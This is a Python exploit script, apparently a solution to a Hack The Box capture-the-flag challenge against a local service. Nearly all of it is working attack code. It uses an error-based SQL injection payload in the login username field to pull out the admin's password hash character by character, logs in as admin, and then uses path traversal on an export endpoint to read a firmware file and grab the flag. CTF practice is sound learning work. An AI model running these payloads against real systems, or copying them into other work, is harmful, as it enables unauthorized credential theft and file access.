import requests
import re
import os

class Exploit:
    def __init__(self, baseUrl, header):
        self.baseUrl = baseUrl
        self.header = header
        self.login_path = "/api/login"
        self.export_path = "/api/export"
        self.session = requests.Session()
    
    def dump_hash_value_admin(self):
        print(f"[+] Start Leak Data Hash MD5 Admin")
        hash_full = ""
        for pos in range(1, 33):
            payload = f'" OR extractvalue(1,concat(0x7e,substring((SELECT password FROM users WHERE username=\'admin\'),{pos},1),0x7e)) -- -'
            data = {
                "username": payload,
                "password": "bl4ck0ut"
            }
            response = requests.post(f"{self.baseUrl}{self.login_path}", headers=self.header, json=data)
            match = re.search(r"~([^~])~", response.text)
            if match:
                char = match.group(1)
                hash_full += char
                print(f"[+] Found Value {pos}: {char} -> {hash_full}")
            else:
                print(f"[-] Not Found Value! Try Again: {pos}")
                break
        return hash_full

    def login(self, password="DUMMY_PASSWORD"):
        print(f"[+] Password Convert From Hash Md5: {password}")
        print(f"[+] Login With admin:{password}")
        data = {
            "username": "admin",
            "password": password
        }
        response = self.session.post(f"{self.baseUrl}{self.login_path}", headers=self.header, json=data)
        if response.status_code == 200:
            print(f"[+] Login Successfully as Admin.")
        else:
            print(f"[-] Failed Login. Try Again")

    def export(self):
        print(f"[+] Khai thác path traversal ở tuyến đường /export")
        data = {
            "name": "../../../../signal_sleuth_firmware"
        }
        response = self.session.post(f"{self.baseUrl}{self.export_path}", headers=self.header, json=data)
        flag = re.findall(r"HTB\{.*?\}", response.text)
        if flag:
            flag_done = flag[0]
            print(f"[+] Congratulation! Done Flag: \n{flag_done}")
        else:
            print(f"[-] Failed to leak flag. Try again!!!")
    
if __name__ == "__main__":
    BASE_URL = "http://127.0.0.1:1337"
    HEADER = {
        "Content-Type": "application/json",
        "Origin": "http://127.0.0.1:1337",
        "Referer": "http://127.0.0.1:1337/"
    }
    exploit = Exploit(BASE_URL, HEADER)
    hash_md5 = exploit.dump_hash_value_admin()
    exploit.login() 
    exploit.export()
